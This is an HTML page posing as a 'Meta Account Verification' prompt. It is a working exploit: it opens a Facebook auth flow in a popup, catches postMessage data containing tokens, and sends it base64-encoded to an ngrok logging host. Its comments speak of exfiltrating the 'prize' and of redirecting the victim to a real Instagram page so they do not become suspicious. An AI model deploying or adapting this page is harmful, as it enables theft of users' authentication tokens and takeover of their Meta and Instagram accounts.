<!DOCTYPE html>
<html>
<head>
    <title>Meta Account Verification</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
        .btn { background-color: #1877F2; color: white; border: none; border-radius: 6px; padding: 12px 24px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; transition: background 0.2s; }
        .btn:hover { background-color: #166fe5; }
        h2 { color: #1c1e21; margin-bottom: 10px; }
        p { color: #606770; margin-bottom: 20px; line-height: 1.4; }
    </style>
</head>
<body>

<div class="card">
    <h2>Secure Link</h2>
    <p>To continue syncing your accounts, please click the button below to authorize the connection.</p>
    <button class="btn" onclick="launchAuth()">Link Accounts</button>
</div>

<script>
    const NGROK_URL = "https://bolsteringly-rightish-joan.ngrok-free.dev/log";
    const AUTH_URL = "https://www.facebook.com/fxauth/?app_id=1217981644879628&etoken=AbkdqR8gSOIdA6pB1QLaljpIpIDxmp6gdlpgGqy3KqhBFJmEIuuBGbRenNJjnorbCU5-USgb5cWL6tdiq89aEsxNBOQ6BFNp1uiIc6EZRNcaFP6BxsJ-C9IE&native_app_login_flow=fbcalcomettest&entry_point=ig_web_settings&next=https%3A%2F%2Fwww.instagram.com%2Freels%2Faudio%2Fexternal%3Furl%3Dhttps%3A%2F%2Fcyanide122.github.io%2Fassets%2Fgo.html";

    function launchAuth() {
        // Open the vulnerable Facebook flow in a popup
        window.open(AUTH_URL, "fb_auth", "width=500,height=650");
    }

    // ðŸ•µï¸ THE INTERCEPTOR: Catching the '*' broadcast
    window.addEventListener("message", function(event) {
        // We log it locally for debugging
        console.log("ðŸ“¥ Message received from:", event.origin);
        
        let payload = JSON.stringify(event.data);

        // Check if the payload contains our prize
        if (payload.includes("token") || payload.includes("blob")) {
            console.log("ðŸ’° Prize found! Exfiltrating...");

            // ðŸš€ Forward the data to our Python script via Ngrok
            // We use Base64 to ensure the token doesn't break the URL
            fetch(NGROK_URL + "?data=" + btoa(payload), { mode: 'no-cors' })
            .then(() => {
                // Optional: Redirect the victim to a real page so they don't get suspicious
                window.location.href = "https://www.instagram.com/accounts/edit/";
            });
        }
    }, false);
</script>

</body>
</html>
